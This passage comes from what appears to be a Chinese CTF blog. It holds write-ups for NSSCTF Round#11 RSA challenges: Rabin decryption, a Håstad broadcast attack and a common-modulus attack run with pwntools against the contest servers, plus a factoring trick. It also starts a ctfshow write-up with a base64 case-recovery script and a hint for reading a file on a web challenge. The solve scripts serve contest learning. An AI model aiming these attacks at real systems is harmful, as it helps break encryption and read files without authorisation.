class="number">4</span>, p)</span><br><span class="line">        s = <span class="built_in">pow</span>(c2, (q + <span class="number">1</span>) // <span class="number">4</span>, q)</span><br><span class="line"></span><br><span class="line">        x = (r * x1 * q + s * x0 * p) % n</span><br><span class="line">        y = (r * x1 * q - s * x0 * p) % n</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">not</span> <span class="keyword">in</span> ps:</span><br><span class="line">            ps.append(x)</span><br><span class="line">        <span class="keyword">if</span> n - x <span class="keyword">not</span> <span class="keyword">in</span> ps:</span><br><span class="line">            ps.append(n - x)</span><br><span class="line">        <span class="keyword">if</span> y <span class="keyword">not</span> <span class="keyword">in</span> ps:</span><br><span class="line">            ps.append(y)</span><br><span class="line">        <span class="keyword">if</span> n - y <span class="keyword">not</span> <span class="keyword">in</span> ps:</span><br><span class="line">            ps.append(n - y)</span><br><span class="line">    cs = ps</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> ps:</span><br><span class="line">    flag = long_to_bytes(m)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;NSS&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="comment"># NSSCTF&#123;f594e3cd-2b9f-4fbf-992b-40e51897798e&#125;</span></span><br></pre></td></tr></table></figure>



<h1 id="MyMessage"><a href="#MyMessage" class="headerlink" title="MyMessage"></a>MyMessage</h1><p>交互式得低指加密广播攻击</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line">e = <span class="number">127</span></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28154</span>)</span><br><span class="line"><span class="comment">#命令简写化</span></span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :sh.sendlineafter(delim, data)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims    :sh.recvuntil(delims,drop=<span class="literal">True</span>)  <span class="comment">#接收数据直到delims截止，Ture是不舍弃delims</span></span><br><span class="line">n=[]</span><br><span class="line">c=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">64</span>):</span><br><span class="line">    sla(<span class="string">&quot;Input message：&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    ru(<span class="string">&quot;n: &quot;</span>)</span><br><span class="line">    n.append(<span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>),<span class="number">10</span>))</span><br><span class="line">    ru(<span class="string">&quot;Token: &quot;</span>)</span><br><span class="line">    c.append(<span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>))</span><br><span class="line">    <span class="comment">#print(n,hex(c[0]))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CRT</span>(<span class="params">mi, ai</span>):</span><br><span class="line">    <span class="keyword">assert</span> (reduce(gmpy2.gcd, mi) == <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">assert</span> (<span class="built_in">isinstance</span>(mi, <span class="built_in">list</span>) <span class="keyword">and</span> <span class="built_in">isinstance</span>(ai, <span class="built_in">list</span>))</span><br><span class="line">    M = reduce(<span class="keyword">lambda</span> x, y: x * y, mi)</span><br><span class="line">    ai_ti_Mi = [a * (M // m) * gmpy2.invert(M // m, m) <span class="keyword">for</span> (m, a) <span class="keyword">in</span> <span class="built_in">zip</span>(mi, ai)]</span><br><span class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x, y: x + y, ai_ti_Mi) % M</span><br><span class="line">m=CRT(n,c)</span><br><span class="line">M = long_to_bytes(<span class="built_in">int</span>(gmpy2.iroot(gmpy2.mpz(m),e)[<span class="number">0</span>]))</span><br><span class="line"><span class="built_in">print</span>(M)</span><br><span class="line"></span><br><span class="line"><span class="comment">#NSSCTF&#123;c05c93d8-20de-433d-8202-3d8262f31bc0&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="ez-fac"><a href="#ez-fac" class="headerlink" title="ez_fac"></a>ez_fac</h1><p>题目</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,a0,a1,b0,b1</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">e = getPrime(<span class="number">128</span>)</span><br><span class="line">n = p*q</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">pow</span>(a0,<span class="number">2</span>) + e * <span class="built_in">pow</span>(b0,<span class="number">2</span>) == n</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">pow</span>(a1,<span class="number">2</span>) + e * <span class="built_in">pow</span>(b1,<span class="number">2</span>) == n</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a0=&quot;</span>,a0)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a1=&quot;</span>,a1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;b0=&quot;</span>,b0)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;b1=&quot;</span>,b1)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>脚本</p>
<p><img src="/2023/04/09/NSSCTF-Round-11/image-20230408223534160.png" alt="image-20230408223534160"></p>
<p>根据这个论文内容</p>
<p>p&#x3D;gcd(n,a0b1-a1b0)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">c= <span class="number">96496391731007518897413814188008837720590769169211349809877119278985060969026829802572421817888265342360728332919792452440257688078830103285268813765013959424069955273085274413461221917705521199430165698638444416803428336335625130197212968481383466732608552580369509828042748166516923158871160383760272230369</span></span><br><span class="line">n= <span class="number">141463050429131153304507639706519453416500899516192888621725244147759861249532811353612272262251738001327556271543066487909395260247788929891078913533139738961651278577096628336832901751330655366664417508431204965468392923655570929035177816875190252113101286809899310780398065797539784080443884076015636565653</span></span><br><span class="line">a0= <span class="number">11893824045660468459077133582738838417842593231821092698714037336632395431658199472925765178830611973650766264632249341194655235407390022682840914711732709</span></span><br><span class="line">a1= <span class="number">11893824045660468459077133226975764782410316195614509064302075133171334301975298793502355669613006211742097696027917390142838498212910217928927499841689611</span></span><br><span class="line">b0= <span class="number">72637686840312330318324544577081835760892845722490802999295104254521408572725988691542710106291484785108130437411841119266</span></span><br><span class="line">b1= <span class="number">199793516086267640308411342691103208215027194945128541613925289581349442759392411456693594969683135744315154264882943680006</span></span><br><span class="line">p=gmpy2.gcd(n,a0*b1-a1*b0)</span><br><span class="line">q=n//p</span><br><span class="line">e=(<span class="built_in">pow</span>(a0,<span class="number">2</span>)-<span class="built_in">pow</span>(a1,<span class="number">2</span>))//(<span class="built_in">pow</span>(b1,<span class="number">2</span>)-<span class="built_in">pow</span>(b0,<span class="number">2</span>))</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment">#NSSCTF&#123;e2e87199-7473-4548-bc29-0e1ddccd1adb&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="MyGame"><a href="#MyGame" class="headerlink" title="MyGame"></a>MyGame</h1><p>题目</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">flag = os.getenv(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;&#x27;=---menu---=</span></span><br><span class="line"><span class="string">1. Guess</span></span><br><span class="line"><span class="string">2. Encrypt</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">randommsg</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.choices(string.ascii_lowercase+string.digits, k=<span class="number">30</span>))</span><br><span class="line"></span><br><span class="line">mymsg = randommsg()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guess</span>():</span><br><span class="line">    <span class="keyword">global</span> mymsg</span><br><span class="line">    msg = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> msg == mymsg:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(mymsg)</span><br><span class="line">        mymsg = randommsg()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>():</span><br><span class="line">    e = random.getrandbits(<span class="number">8</span>)</span><br><span class="line">    c = <span class="built_in">pow</span>(bytes_to_long(mymsg.encode()), e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Cipher_<span class="subst">&#123;e&#125;</span>: <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;n: <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        opt = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> opt == <span class="number">1</span>:</span><br><span class="line">            guess()</span><br><span class="line">        <span class="keyword">elif</span> opt == <span class="number">2</span>:</span><br><span class="line">            encrypt()</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<p>脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> binascii, gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------ 交互部分 ------------</span></span><br><span class="line">host = <span class="string">&#x27;node1.anna.nssctf.cn&#x27;</span></span><br><span class="line">port = <span class="number">28935</span></span><br><span class="line">conn = remote(host, port)</span><br><span class="line">data1 = conn.recvline().decode()</span><br><span class="line">n = <span class="built_in">int</span>(re.findall(<span class="string">r&#x27;n: (\d+)&#x27;</span>, data1)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">interact_with_server</span>(<span class="params">conn</span>):</span><br><span class="line">    conn.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    data1 = conn.recvline().decode()</span><br><span class="line">    <span class="built_in">print</span>(data1)</span><br><span class="line">    e, c = re.findall(<span class="string">r&#x27;Cipher_(\d+): (\d+)&#x27;</span>, data1)[<span class="number">0</span>]</span><br><span class="line">    e = <span class="built_in">int</span>(e)</span><br><span class="line">    c = <span class="built_in">int</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> e, c</span><br><span class="line"></span><br><span class="line"><span class="comment">#共模攻击</span></span><br><span class="line"><span class="comment">#共模攻击函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_gong_N_def</span>(<span class="params">e1,e2,c1,c2,n</span>):</span><br><span class="line">    e1, e2, c1, c2, n=<span class="built_in">int</span>(e1),<span class="built_in">int</span>(e2),<span class="built_in">int</span>(c1),<span class="built_in">int</span>(c2),<span class="built_in">int</span>(n)</span><br><span class="line">    s = gmpy2.gcdext(e1, e2)</span><br><span class="line">    s1 = s[<span class="number">1</span>]</span><br><span class="line">    s2 = s[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">        s1 = - s1</span><br><span class="line">        c1 = gmpy2.invert(c1, n)</span><br><span class="line">    <span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">        s2 = - s2</span><br><span class="line">        c2 = gmpy2.invert(c2, n)</span><br><span class="line">    m = (<span class="built_in">pow</span>(c1,s1,n) * <span class="built_in">pow</span>(c2 ,s2 ,n)) % n</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(m)</span><br><span class="line">e1,c1=interact_with_server(conn)</span><br><span class="line">e2,c2=interact_with_server(conn)</span><br><span class="line"></span><br><span class="line">m = rsa_gong_N_def(e1, e2, c1, c2, n)</span><br><span class="line">flag = libnum.n2s(<span class="built_in">int</span>(m))</span><br><span class="line">conn.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">conn.sendline(flag)</span><br><span class="line"><span class="built_in">print</span>(conn.recvline().decode())</span><br><span class="line"><span class="comment">#NSSCTF&#123;0d11d1d2-22c5-41ec-88c8-b3e70cb61a0b&#125;</span></span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/NSSCTF-Round-11/" rel="tag">NSSCTF Round#11</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-2023-ctfshow愚人杯"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/04/06/2023-ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/"
    >2023 ctfshow愚人杯</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/04/06/2023-ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/" class="article-date">
  <time datetime="2023-04-06T15:08:28.000Z" itemprop="datePublished">2023-04-06</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/match/">match</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="热身"><a href="#热身" class="headerlink" title="热身"></a>热身</h1><p><img src="/2023/04/06/2023-ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230406194116453.png" alt="image-20230406194116453"></p>
<p>ctfshow{一个不能说的秘密}</p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><p>低端的base64</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string,base64,re</span><br><span class="line"><span class="keyword">import</span> itertools, tqdm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x=<span class="string">&quot;5li65lqg6ziy5q2i5asn5a625oml5yqo5pon5l2c5oir5bey57up5oqk5byx6i6x6zibkgzsywcp6jep5zyo6l+z5q616k+d55qe5p+q5liq5zyw5pa55lqg77ym5l2g5lus5lin5lia5a6a5om+5b6x5yiw5zof77ym5zi75zi75zi744cc5awx56we5p2l5pwy5l2g5a626zeo77ym5bim552a56ev57sv5zkm54m55b6b77ym5z2m55m95luo5a695oqx5ous5luo5lil77ym5lin5zcs6k+d57uz5l2g5omt5lia6zki44cckgzsywcp5zyo5zoq6yem5zgakgzsywcp5zyo5zoq6yem77ymkgzsywcp5zyo6ykj5bcp5pyl5y+l55qe55y8552b6yem44cc5asp5a+55zyw77ym6zuo5a+56aoo44cc5asn6zmg5a+56zw/56m644cc5bgx6iqx5a+55rw35qcr77ym6lwk5pel5a+56iun56m544cc6zu36zqq6zqq77ym6zu+6jkz6jkz44cc5bya5bic5asn5zcj5lih5lql5lqo6yca44cc5bmz5lue5bmz5lue5bmz5bmz5lue77ym5lue5bmz5lue5bmz5lue5lue5bmz77ym5lue5lue5bmz44cc5lyx5oma5zgo55+l77ymj2n0znnob3cn55qekgzsywcp5yw35ash5lul5lil5yeg5liq54m554k577ym5lia5piv5lulj2n0znnob3cn5bya5as077ym5zco6z2i6lef552a6iqx5ous5y+35zkm5yeg5liq5awh5ocq55qe5lic6kw/77ym6ykj5liq5lic6kw/5y+r5ygaj3v1awqn77ym5li65lua5lmi5ymn6z2i6kab6k+06l+z5lmi5asa5bqf6k+d5zgi5piv5zug5li65lih5lia5lin6k+05bqf6k+d6l+z5liq6aky5bcx5asq5aw95yga5lqg6l+z5oco5lmi5y+v5lul5zgi77ym5lih5lia5pyj5lq65oqk6l+z5liq5lic6kw/5ps+5zyoy3lizxjjagvm6yem5lia5oqk5qkt5l2g5piv5qkt5lin5ye65p2l77ym54s25zco5yan57uz5oir6l+z5lmi5lia5liq6iux5pah5a2x5q+n5lia5liq6iux5pah5a2x5q+n55qe5ps55asn5bcp5yaz77ym6l+z5oco5lmi6io96kgm5zgi77ym6l+z6ikv5a6a5piv5lin6kgm55qe5a+55lin5a+5iwn0znnob3d7ymfzzty0xzfz5asq6zq+5lqgisfj5pyn5lqgvsf95oma5lul5oir6l+z5zue5zc45y+w5pwz6k6t77ym5zyo5ymn5zco6yo95yqg5lqg5lia54k554k55lic5lic77ym6l+z5qc35bcx5lin6io95pyj5bii5ykf5oml5yqo5p2l5ps55lqg5a+55lin5a+55zga44cc5oir5y+j6kkl6yem5pyj5lia5liq5bcp6k6+5ash77ym5y+v5lul6k6/6zeu5yeg5lmo5ywo6yoo55qe5lq657g755+l6k+g44cc5oir5y2055so5a6d5lio5lin6k6k6k+g55qe5lq66l+b6kgm5q+r5peg5osp5lmj55qe5lqj6k6677ym5bm255yl5o6i5aes55qe54wn54mh44cc5b2x5zon57yw56il5pwi546h5pya5asn55qe5zug57sg77ym5lin5piv5l2/55so5l2v56en57yw56il6k+t6kia77ym6icm5piv5pio5pma5l2g55qe552h55yg5piv5zcm5ywf6laz44ccssb3b3jrighhcmqgzxzlcnlkyxkgc28gdghhdcbhbgwgd2hvigxvdmugbwugd2lsbcbizsbwcm91zcbvzibtzseh6z2i5zcr5a+56lgh57yw56il55qe6zeu6aky5piv77ym6buy6k6k5bim5pyj546v5akd44cc5l2g5y+q5ooz6kab5lia5liq6aaz6jwj77ym5l2g5piv5b6x5yiw5lqg5lia5y+q5ou/552a6aaz6jwj55qe5asn54yp54yp77ym55sa6iez6l+y5pyj5pw05liq5lib5p6x44cc5l2g5lin5piv6k6o5y6mj0phdmen77ym5l2g5y+q5piv6k6o5y6m5bel5l2c44cc6icm5bcx5zyo5q2k5pe25oir5bey57up5ooz5lin5ye66aqa6k+d5lqg6l+z5y+v5oco5lmi5yqe5zga77ym5oma5lul5oir5om+576k5y+l5b6b6zug5lqg5lia5lqb6aqa6k+d6l+z5qc35oir5bcx5lin55so57un57ut56cb5a2x5lqg44cctmlnahqgaxmgbmv2zxigzgfyay5jbib0agugbmlnahqsqwxiaxp6awegaxmgc3rpbgwgcmvkllrozsbqbhvzacbxaxn0zxjpysbpcybzdglsbcbwdxjwbgutd2hpdguusxqgagfzig5vdghpbmcgdg8gzg8gd2l0acbuawdodcbvcibkyxkutglrzsxjig1pc3mgew91lel0ighhcybub3roaw5nihrvigrvihdpdgggc3vuc2hpbmugb3igcmfpbi5jdcbkb2vzbid0igv2zw4gbwf0dgvyiglmihlvdsbrbm93ig9yigrvbid0igtub3cuqwx0ag91z2ggssb3awxsihryesb0bybszxqgew91igtub3csvghpbmsgb2ygaxquu28gssbyzwpvawnlzc4g6bur5asc5yw25a6e5luo5p2l5bcx5lin5piv6bur55qe77ym6bur5asc6yem77ym5zci5qyi6iqx6l+y5piv57qi55qe44cc5q+b57us57us55qe57sr6jek6iqx6l+y5piv57sr55m96imy55qe77ym5zkm6bur5asc6l+y5piv55m95asp5rkh5pyj5ywz57o744cc5bcx5yop77ym5oir5ooz5l2g77ym5zkm6bur5asc6l+y5piv55m95asp5rkh5pyj5ywz57o777ym5zkm5pm05asp5zkm5lil6zuo5rkh5pyj5ywz57o777ym55sa6iez5zkm5l2g55+l6ygt5lin55+l6ygt6yo95rkh5pyj5ywz57o777ym5bc9566h5oir6l+y5piv5lya5bc96yep6k6p5l2g55+l6ygt77ym5ooz5yiw6l+z6yem77ym5lqo5piv5qyi5zac44cc&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_4</span>(<span class="params">base64_part</span>):<span class="comment">#base64的原理是3个字符转化成4个字符，也就是4位base64正好对应3个原文，这里检查原文是否在可见字符范围内。</span></span><br><span class="line">        _temp=[]</span><br><span class="line">        results=[]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                <span class="keyword">if</span> base64_part[i].isalpha():</span><br><span class="line">                        _temp.append((base64_part[i].upper(),base64_part[i].lower()))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                        _temp.append((base64_part[i],base64_part[i]))</span><br><span class="line">        n=<span class="built_in">map</span>(<span class="built_in">tuple</span>, itertools.product(_temp[<span class="number">0</span>],_temp[<span class="number">1</span>],_temp[<span class="number">2</span>],_temp[<span class="number">3</span>]))</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">set</span>(n):</span><br><span class="line">                s=<span class="string">&#x27;%s%s%s%s&#x27;</span>%i</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                        result=base64.b64decode(s.encode()).decode()</span><br><span class="line">                        <span class="keyword">if</span> result.isprintable():</span><br><span class="line">                                results.append(result)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span>(results)</span><br><span class="line"></span><br><span class="line">l=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">len</span>(x)/<span class="number">4</span>)):</span><br><span class="line">        l.append(check_4(x[i*<span class="number">4</span>:i*<span class="number">4</span>+<span class="number">4</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(l)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得出的东西自己组合一下得到</p>
<p>ctfshow{base64_1s太难了!!I服了U!}</p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="easy-signin"><a href="#easy-signin" class="headerlink" title="easy_signin"></a>easy_signin</h2><p><img src="/2023/04/06/2023-ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230404004547648.png" alt="image-20230404004547648"></p>
<p>然后尝试  把  index.php编码  传入参数 aW5kZXgucGhw</p>
